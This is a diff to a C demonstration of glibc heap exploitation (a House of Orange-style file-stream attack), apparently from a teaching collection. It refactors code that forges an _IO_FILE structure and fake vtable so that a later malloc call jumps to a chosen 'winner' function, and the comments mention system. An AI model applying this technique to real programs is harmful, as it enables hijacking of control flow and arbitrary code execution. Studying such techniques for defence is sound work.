@@ -209,32 +209,40 @@ int main()
       required by the function _IO_flush_all_lockp and tested here:
       https://code.woboq.org/userspace/glibc/libio/genops.c.html#813
 
-       1) base_address+0xc0 == 1
+      We want to satisfy the first condition:
+      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
     */
 
-    top[24] = 1;
+    _IO_FILE *fp = (_IO_FILE *) top;
+
 
     /*
-      2) We require two integers such that they are adjacent and the first is smaller
+      1. Set mode to 0: fp->_mode <= 0
     */
 
-    top[21] = 2;
-    top[22] = 3;
+    fp->_mode = 0; // top+0xc0
+
 
     /*
-      3) base_address+0xa0 should contain a pointer that contains
-         mentioned variables at offsets 0x18 and 0x20
+      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
     */
 
-    top[20] = (size_t) &top[18];
+    fp->_IO_write_base = (char *) 2; // top+0x20
+    fp->_IO_write_ptr = (char *) 3; // top+0x28
+
 
     /*
-      4) base_address+0xd8 = jump_table
-         4-a) jump_table+0x18 == system
+      4) Finally set the jump table to controlled memory and place system there.
+      The jump table pointer is right after the _IO_FILE struct:
+      base_address+sizeof(_IO_FILE) = jump_table
+
+         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
     */
 
-    top[15] = (size_t) &winner;
-    top[27] = (size_t ) &top[12];
+    size_t *jump_table = &top[12]; // controlled memory
+    jump_table[3] = (size_t) &winner;
+    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8
+
 
     /* Finally, trigger the whole chain by calling malloc */
     malloc(10);
